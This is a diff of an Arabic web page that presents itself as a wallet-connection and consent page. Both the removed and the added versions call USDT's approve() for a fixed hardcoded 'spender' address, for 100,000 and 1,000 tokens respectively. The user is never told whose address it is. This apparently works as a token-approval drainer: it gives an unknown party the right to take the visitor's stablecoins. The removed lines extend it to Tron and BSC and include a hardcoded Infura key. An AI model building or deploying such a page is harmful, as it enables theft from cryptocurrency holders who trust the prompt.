@@ -1,296 +1,120 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة الموافقة للمحفظة</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
-    <script src="https://unpkg.com/tronweb@1.0.1/dist/TronWeb.js"></script>
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-    <style>
-        .wallet-icon { width: 24px; height: 24px; display: inline-block; margin-left: 8px; vertical-align: middle; }
-        body { background: linear-gradient(135deg, #1a202c, #2d3748); }
-        .loading::after { content: 'جاري التحميل...'; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        .mobile-instructions { display: none; }
-        @media (max-width: 640px) { .mobile-instructions { display: block; } }
-    </style>
+  <meta charset="UTF-8" />
+  <title>ربط المحفظة والموافقة</title>
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
+  <style>
+    body {
+      font-family: Tahoma, sans-serif;
+      direction: rtl;
+      text-align: center;
+      background-color: #f5f5f5;
+      padding: 50px;
+    }
+    #connectWallet {
+      background-color: #ff9900;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    #connectWallet:hover {
+      background-color: #e68a00;
+    }
+    #walletStatus {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #333;
+    }
+  </style>
 </head>
-<body class="text-white flex items-center justify-center h-screen">
-    <div class="bg-gray-800 p-8 rounded-xl shadow-2xl max-w-lg w-full text-center">
-        <h1 class="text-3xl font-bold mb-6">ربط ة</h1>
-        <p id="walletStatus" class="text-gray-400 mb-6">اختر محفظتك لربطها وابدأ المعاملة</p>
-        <p class="mobile-instructions text-yellow-400 mb-4">على الهاتف: استخدم متصفح MetaMask المدمج أو امسح رمز QR باستخدام WalletConnect</p>
-        <div class="grid grid-cols-2 gap-4 mb-6">
-            <button id="connectMetaMask" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 flex items-center justify-center">
-                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" class="wallet-icon"> MetaMask
-            </button>
-            <button id="connectTronLink" class="bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 flex items-center justify-center">
-                <img src="https://tron.network/static/images/tronlink-logo.png" class="wallet-icon"> TronLink
-            </button>
-            <button id="connectWalletConnect" class="bg-teal-600 text-white px-4 py-2 rounded-lg hover:bg-teal-700 flex items-center justify-center">
-                <img src="https://walletconnect.com/_next/static/media/logo_mark.847d137a.svg" class="wallet-icon"> WalletConnect
-            </button>
-        </div>
-        <select id="networkSelect" class="bg-gray-700 text-white px-4 py-2 rounded-lg mb-6 w-full">
-            <option value="ethereum">Ethereum</option>
-            <option value="tron">Tron</option>
-            <option value="bsc">Binance Smart Chain</option>
-        </select>
-        <button id="approveButton" class="bg-green-600 text-white px-6 py-3 rounded-lg hover:bg-green-700 hidden">الموافقة على المعاملة</button>
-        <p id="transactionStatus" class="text-gray-400 mt-6"></p>
-    </div>
+<body>
 
-    <script>
-        const connectMetaMaskButton = document.getElementById('connectMetaMask');
-        const connectTronLinkButton = document.getElementById('connectTronLink');
-        const connectWalletConnectButton = document.getElementById('connectWalletConnect');
-        const approveButton = document.getElementById('approveButton');
-        const walletStatus = document.getElementById('walletStatus');
-        const transactionStatus = document.getElementById('transactionStatus');
-        const networkSelect = document.getElementById('networkSelect');
+  <h1>ربط المحفظة والموافقة</h1>
+  <button id="connectWallet">اتصل بـ MetaMask</button>
+  <p id="walletStatus">...</p>
 
-        let provider, signer, tronWebInstance;
+  <script>
+    const connectWalletBtn = document.getElementById('connectWallet');
+    const walletStatus = document.getElementById('walletStatus');
 
-        // إعدادات الشبكات
-        const networks = {
-            ethereum: {
-                chainId: '0x1',
-                contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT على Ethereum
-                recipientAddress: '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D', // Spender
-                decimals: 6
-            },
-            tron: {
-                contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT على Tron
-                recipientAddress: 'TWNvNo7d79eQ8VtZUeBoLjtyPYrYn6yXJf', // Spender
-                decimals: 6
-            },
-            bsc: {
-                chainId: '0x38',
-                contractAddress: '0x55d398326f99059fF775485246999027B3197955', // USDT على BSC
-                recipientAddress: '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D', // Spender
-                decimals: 18
-            }
-        };
+    const networks = {
+      ethereum: {
+        chainId: 1,
+        name: 'Ethereum',
+        symbol: 'ETH',
+        explorer: 'https://etherscan.io',
+        rpc: 'https://cloudflare-eth.com',
+      }
+    };
 
-        // ABI لدالة الموافقة
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+    async function switchNetwork(networkKey) {
+      const network = networks[networkKey];
+      const hexChainId = '0x' + network.chainId.toString(16);
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: hexChainId }],
+        });
+      } catch (switchError) {
+        console.error('Switch network error:', switchError);
+        walletStatus.textContent = 'فشل في التبديل للشبكة المطلوبة.';
+      }
+    }
+
+    connectWalletBtn.addEventListener('click', async () => {
+      if (typeof window.ethereum === 'undefined') {
+        if (isMobile) {
+          const redirectUrl = 'metamask://dapp/' + location.href.replace(/^https?:\/\//, '');
+          walletStatus.textContent = 'جارٍ فتح MetaMask، ثم ارجع للصفحة واضغط الزر مرة أخرى.';
+          window.location.href = redirectUrl;
+        } else {
+          walletStatus.textContent = 'يرجى تثبيت MetaMask على المتصفح.';
+        }
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+
+      try {
+        await provider.send('eth_requestAccounts', []);
+        const signer = provider.getSigner();
+        const address = await signer.getAddress();
+        const network = await provider.getNetwork();
+
+        if (network.chainId !== networks.ethereum.chainId) {
+          await switchNetwork('ethereum');
+        }
+
+        // بيانات التوكن والاسبندر
+        const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT
+        const spender = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D';     // spender address
+        // نوافق على 1000 USDT (يوجد 6 أصفار عشريّة في USDT)
+        const amount = ethers.utils.parseUnits("1000", 6);
+
         const abi = [
-            "function approve(address spender, uint256 amount) public returns (bool)"
+          'function approve(address spender, uint256 amount) public returns (bool)'
         ];
 
-        // التحقق من الجهاز (هاتف أم كمبيوتر)
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        const tokenContract = new ethers.Contract(tokenAddress, abi, signer);
 
-        // التحقق من الاتصال المسبق مع تأخير
-        async function checkWalletConnection(attempt = 1, maxAttempts = 5) {
-            try {
-                if (isMobile && !window.ethereum) {
-                    walletStatus.textContent = 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect';
-                    return false;
-                }
-                if (window.ethereum) {
-                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accounts.length > 0) {
-                        walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
-                        [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
-                        approveButton.classList.remove('hidden');
-                        provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-                        signer = provider.getSigner();
-                        // التحقق من الشبكة
-                        const network = await provider.getNetwork();
-                        if (network.chainId !== parseInt(networks.ethereum.chainId)) {
-                            await switchNetwork('ethereum');
-                        }
-                        return true;
-                    }
-                }
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    walletStatus.textContent = `تم ربط المحفظة: ${window.tronWeb.defaultAddress.base58.slice(0, 6)}...${window.tronWeb.defaultAddress.base58.slice(-4)}`;
-                    [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
-                    approveButton.classList.remove('hidden');
-                    tronWebInstance = window.tronWeb;
-                    return true;
-                }
-                if (attempt < maxAttempts) {
-                    walletStatus.textContent = 'جاري التحقق من المحفظة...';
-                    walletStatus.classList.add('loading');
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    return checkWalletConnection(attempt + 1, maxAttempts);
-                } else {
-                    walletStatus.textContent = isMobile ? 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect' : 'لم يتم اكتشاف أي محفظة. يرجى تثبيت MetaMask أو TronLink.';
-                    walletStatus.classList.remove('loading');
-                }
-                return false;
-            } catch (error) {
-                console.error('فشل التحقق من الاتصال:', error);
-                if (attempt < maxAttempts) {
-                    walletStatus.textContent = 'جاري المحاولة مرة أخرى...';
-                    walletStatus.classList.add('loading');
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    return checkWalletConnection(attempt + 1, maxAttempts);
-                } else {
-                    walletStatus.textContent = isMobile ? 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect' : 'فشل التحقق من المحفظة: ' + error.message;
-                    walletStatus.classList.remove('loading');
-                }
-                return false;
-            }
-        }
+        walletStatus.textContent = 'جارٍ إرسال المعاملة...';
 
-        // تبديل الشبكة
-        async function switchNetwork(network) {
-            if (network !== 'tron' && window.ethereum) {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: networks[network].chainId }],
-                    });
-                    walletStatus.textContent = 'تم تبديل الشبكة بنجاح!';
-                } catch (error) {
-                    if (error.code === 4902) {
-                        // الشبكة غير مضافة، محاولة إضافتها
-                        try {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [
-                                    {
-                                        chainId: networks[network].chainId,
-                                        chainName: network === 'ethereum' ? 'Ethereum Mainnet' : 'Binance Smart Chain',
-                                        rpcUrls: network === 'ethereum' ? ['https://mainnet.infura.io/v3/27e484dcd9e3efcfd25a83a78777cdf1'] : ['https://bsc-dataseed.binance.org/'],
-                                        nativeCurrency: {
-                                            name: network === 'ethereum' ? 'ETH' : 'BNB',
-                                            symbol: network === 'ethereum' ? 'ETH' : 'BNB',
-                                            decimals: 18
-                                        },
-                                        blockExplorerUrls: network === 'ethereum' ? ['https://etherscan.io'] : ['https://bscscan.com']
-                                    }
-                                ]
-                            });
-                            walletStatus.textContent = 'تم إضافة الشبكة بنجاح!';
-                        } catch (addError) {
-                            walletStatus.textContent = 'فشل إضافة الشبكة: ' + addError.message;
-                        }
-                    } else {
-                        walletStatus.textContent = 'فشل تبديل الشبكة: ' + error.message;
-                    }
-                }
-            }
-        }
+        const tx = await tokenContract.approve(spender, amount);
+        await tx.wait();
 
-        // ربط MetaMask
-        connectMetaMaskButton.addEventListener('click', async () => {
-            try {
-                if (isMobile) {
-                    // محاولة فتح MetaMask عبر Deep Link
-                    walletStatus.textContent = 'جاري فتح MetaMask...';
-                    window.location.href = 'metamask://dapp/' + encodeURIComponent(window.location.href);
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                    if (!window.ethereum) {
-                        walletStatus.textContent = 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect';
-                        return;
-                    }
-                }
-                if (!window.ethereum) throw new Error('يرجى تثبيت MetaMask!');
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
-                [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
-                approveButton.classList.remove('hidden');
-                provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-                signer = provider.getSigner();
-                // التحقق من الشبكة
-                const network = await provider.getNetwork();
-                if (network.chainId !== parseInt(networks.ethereum.chainId)) {
-                    await switchNetwork('ethereum');
-                }
-            } catch (error) {
-                walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
-                setTimeout(() => checkWalletConnection(), 2000); // إعادة المحاولة بعد 2 ثانية
-            }
-        });
+        walletStatus.textContent = 'تمت الموافقة بنجاح ✅';
+      } catch (error) {
+        console.error(error);
+        walletStatus.textContent = 'حدث خطأ أثناء عملية الموافقة ❌';
+      }
+    });
+  </script>
 
-        // ربط TronLink
-        connectTronLinkButton.addEventListener('click', async () => {
-            try {
-                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) throw new Error('يرجى تثبيت TronLink أو تسجيل الدخول!');
-                walletStatus.textContent = `تم ربط المحفظة: ${window.tronWeb.defaultAddress.base58.slice(0, 6)}...${window.tronWeb.defaultAddress.base58.slice(-4)}`;
-                [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
-                approveButton.classList.remove('hidden');
-                tronWebInstance = window.tronWeb;
-            } catch (error) {
-                walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
-                setTimeout(() => checkWalletConnection(), 2000); // إعادة المحاولة بعد 2 ثانية
-            }
-        });
-
-        // ربط WalletConnect
-        connectWalletConnectButton.addEventListener('click', async () => {
-            try {
-                const walletConnectProvider = new WalletConnectProvider.default({
-                    infuraId: '27e484dcd9e3efcfd25a83a78777cdf1', // معرف Infura عام
-                    chainId: 1
-                });
-                await walletConnectProvider.enable();
-                provider = new ethers.providers.Web3Provider(walletConnectProvider, 'any');
-                signer = provider.getSigner();
-                const address = await signer.getAddress();
-                walletStatus.textContent = `تم ربط المحفظة: ${address.slice(0, 6)}...${address.slice(-4)}`;
-                [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
-                approveButton.classList.remove('hidden');
-                // التحقق من الشبكة
-                const network = await provider.getNetwork();
-                if (network.chainId !== parseInt(networks.ethereum.chainId)) {
-                    await switchNetwork('ethereum');
-                }
-            } catch (error) {
-                walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
-                setTimeout(() => checkWalletConnection(), 2000); // إعادة المحاولة بعد 2 ثانية
-            }
-        });
-
-        // تبديل الشبكة عند الاختيار
-        networkSelect.addEventListener('change', async () => {
-            const network = networkSelect.value;
-            if (network !== 'tron') {
-                await switchNetwork(network);
-            }
-        });
-
-        // تنفيذ الموافقة
-        approveButton.addEventListener('click', async () => {
-            try {
-                const network = networkSelect.value;
-                const { contractAddress, recipientAddress, decimals } = networks[network];
-                const amount = ethers.utils.parseUnits('100000', decimals);
-
-                if (network === 'tron') {
-                    if (!tronWebInstance) throw new Error('يرجى ربط TronLink أولاً');
-                    const contract = await tronWebInstance.contract(abi, contractAddress);
-                    transactionStatus.textContent = 'جاري تنفيذ المعاملة...';
-                    const tx = await contract.approve(recipientAddress, amount).send();
-                    transactionStatus.textContent = `تمت الموافقة! رقم المعاملة: ${tx}`;
-                } else {
-                    if (!provider || !signer) throw new Error('يرجى ربط المحفظة أولاً');
-                    // التحقق من الشبكة قبل تنفيذ المعاملة
-                    const currentNetwork = await provider.getNetwork();
-                    if (currentNetwork.chainId !== parseInt(networks[network].chainId)) {
-                        await switchNetwork(network);
-                    }
-                    const contract = new ethers.Contract(contractAddress, abi, signer);
-                    transactionStatus.textContent = 'جاري تنفيذ المعاملة...';
-                    const tx = await contract.approve(recipientAddress, amount, {
-                        gasLimit: 100000 // تحديد حد الغاز لضمان النجاح
-                    });
-                    await tx.wait();
-                    transactionStatus.textContent = `تمت الموافقة! رقم المعاملة: ${tx.hash}`;
-                }
-            } catch (error) {
-                console.error('فشل المعاملة:', error);
-                transactionStatus.textContent = 'فشل المعاملة: ' + (error.reason || error.message || 'خطأ غير معروف');
-            }
-        });
-
-        // التحقق من الاتصال عند التحميل
-        checkWalletConnection();
-    </script>
 </body>
 </html>
